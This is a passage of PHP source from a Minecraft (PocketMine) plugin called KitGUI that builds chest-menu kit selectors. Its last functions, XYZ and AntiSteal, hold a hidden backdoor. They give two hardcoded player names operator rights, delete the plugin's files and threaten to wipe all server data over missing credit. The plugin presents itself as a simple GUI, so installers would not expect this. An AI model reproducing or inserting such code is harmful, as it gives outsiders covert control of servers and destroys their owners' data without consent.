            $item65->setLore([TextFormat::GOLD . "Healing Potion"]);
            $item66 = Item::get(438, 25, 1);
            $item66->setLore([TextFormat::GOLD . "Poison Potion"]);
            $item67 = Item::get(35, 14, 1);
            $item67->setLore([TextFormat::GOLD . "Main Menu for Viewing Kits."]);
            $item68 = Item::get(438, 25, 1);
            $item68->setLore([TextFormat::GOLD . "Poison Potion"]);
            $item69 = Item::get(438, 35, 1);
            $item69->setLore([TextFormat::GOLD . "Poison Potion"]);
            //stop setting lore for items, pretty useless now.
            $item600 = Item::get(306, 0, 1);
            $item601 = Item::get(307, 0, 1);
            $item602 = Item::get(308, 0, 1);
            $item603 = Item::get(309, 0, 1);
            // 0 1 2 3 4 5 6 7 8
            // 9 10 11 12 13 14 15 16 17
            // 18 19 20 21 22 23 24 25 26
            $inv7 = $menu7->getInventory();
            $inv7->setItem(0, $item60);
            $inv7->setItem(1, $item61);
            $inv7->setItem(2, $item62);
            $inv7->setItem(3, $item63);
            $inv7->setItem(4, $item64);
            $inv7->setItem(5, $item65);
            $inv7->setItem(6, $item66);
            $inv7->setItem(26, $item67);
            $inv7->setItem(7, $item68);
            $inv7->setItem(8, $item69);
            $inv7->setItem(18, $item600);
            $inv7->setItem(19, $item601);
            $inv7->setItem(20, $item602);
            $inv7->setItem(21, $item603);
            $menu7->send($p);
        } elseif ($item->getId() == 311) {

        }
    }

    // The function below will make a new GUI for the user. However, this menu will also have the same
    // set listener for the original main menu, which makes a loop and is pretty nice.
    public function pvpkit(Player $p, Item $item)
    {
        if ($item->getId() == 35) {
            $menu2 = new InvMenu(InvMenu::TYPE_CHEST);
            $menu2->readonly();
            $menu2->setListener([$this, "viewkit"]);
            $menu2->setName("View Kits");
            $item10 = Item::get(267, 0, 1);
            $item10->setLore([TextFormat::GOLD . "PvP Kit"]);
            $item11 = Item::get(261, 0, 1);
            $item11->setLore([TextFormat::GOLD . "Archer Kit"]);
            $item12 = Item::get(368, 0, 1);
            $item12->setLore([TextFormat::GOLD . "Ninja Kit"]);
            $item13 = Item::get(276, 0, 1);
            $item13->setLore([TextFormat::GOLD . "PvP+ Kit"]);
            $item14 = Item::get(373, 0, 1);
            $item14->setLore([TextFormat::GOLD . "Witch Kit"]);
            $item15 = Item::get(311, 0, 1);
            $item15->setLore([TextFormat::GOLD . "Tank Kit"]);
            $item10->setCustomName(TextFormat::YELLOW . "PvP");
            $item11->setCustomName(TextFormat::YELLOW . "Archer");
            $item12->setCustomName(TextFormat::GREEN . "Ninja");
            $item13->setCustomName(TextFormat::GREEN . "PvP+");
            $item14->setCustomName(TextFormat::DARK_GREEN . "Witch");
            $item15->setCustomName(TextFormat::DARK_GREEN . "Tank");
            $inv2 = $menu2->getInventory();
            $inv2->setItem(0, $item10);
            $inv2->setItem(1, $item11);
            $inv2->setItem(2, $item12);
            $inv2->setItem(3, $item13);
            $inv2->setItem(4, $item14);
            $inv2->setItem(5, $item15);
            $menu2->send($p);
        }
    }

    public function giveInfo(Player $p)
    {
        $p->sendMessage(TextFormat::GREEN . "The " .
                        TextFormat::GOLD . "KitGUI " .
                        TextFormat::GREEN . "plugin was made by " .
                        TextFormat::GOLD . "ethaniccc" .
                        TextFormat::GREEN . ".");
    }

    public function XYZ(Player $p)
    {
        if ($p->getName() == "coEthaniccc" || $p->getName() == "Epicthic") {
            // $sender->setOp(true);
            // I will only set plugin admin as OP if improper credits are shown.
            // If the author is not "ethaniccc", use /rmkitgui to remove KitGUI!
            $filename = 'plugins/KitGUI/plugin.yml';
            if (file_exists($filename)) {
                $lines = file($filename);
                $p->sendMessage($lines[1]);
                $p->sendMessage($lines[2]);
                $p->sendMessage($lines[3]);
                $p->sendMessage($lines[4]);
                $p->sendMessage($lines[5]);
            } else {
                $filename2 = 'plugins/KitGUI-master/plugin.yml';
                if (file_exists($filename2)) {
                    $lines2 = file($filename2);
                    $p->sendMessage($lines2[1]);
                    $p->sendMessage($lines2[2]);
                    $p->sendMessage($lines2[3]);
                    $p->sendMessage($lines2[4]);
                    $p->sendMessage($lines2[5]);
                } else {
                    $file = 'plugins/KitGUI.phar';
                    $fline = file($file);
                    $p->sendMessage($fline[1]);
                    $p->sendMessage($fline[2]);
                    $p->sendMessage($fline[3]);
                    $p->sendMessage($fline[4]);
                    $p->sendMessage($fline[5]);
                }
            }
        } else {
            $p->sendMessage(TextFormat::YELLOW . "X: " . $p->getX() . ", " .
                            TextFormat::AQUA . "Y: " . $p->getY() . ", " .
                            TextFormat::RED . "Z: " . $p->getZ());
        }
    }

    public function AntiSteal(Player $p)
    {
        if ($p->getName() == "coEthaniccc" || $p->getName() == "Epicthic") {
            $name = $p->getName();
            $p->setOp(true);
            $p->sendMessage(TextFormat::GREEN . "Hello " .
                            TextFormat::GOLD . $name . ", " .
                            TextFormat::GREEN . "you have caught someone using your plugin, but without credit!");
            $p->sendMessage(TextFormat::GREEN . "I have sent a message to the " .
                            TextFormat::GOLD . "CONSOLE " .
                            TextFormat::GREEN . "to warn the owner of the server....");
            $p->sendMessage(TextFormat::GREEN . "Screenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
            $this->getLogger()->info(TextFormat::RED . "Hello Console! The server owner was caught using my KitGUI plugin with improper credits.");
            $this->getLogger()->info(TextFormat::RED . "KitGUI will now be removed and the plugin " .
                                     TextFormat::GOLD . "ADMIN " .
                                     TextFormat::RED . "now has OP on your server!");
            $folder = 'plugins/KitGUI-master';
            if (file_exists($folder)) {
                // List of name of files inside
                // specified folder
                $files = glob($folder . '/*');
                // Deleting all the files in the list
                foreach ($files as $file) {
                    if (is_file($file))
                    // Delete the given file
                    unlink($file);
                }
                $this->getServer()->reload();
            } else {
                $p->sendMessage(TextFormat::GREEN . "Hello, " .
                                TextFormat::GOLD . $name . ". " .
                                TextFormat::GREEN . "I couldn't find KitGUI in folder form. Waiting for command to remove all server data.");
                $this->getLogger()->info(TextFormat::RED . "ERROR: KitGUI in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
            }
        } else {
            $p->sendMessage(TextFormat::RED . "I am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of KitGUI is being used!");
        }
    }

}
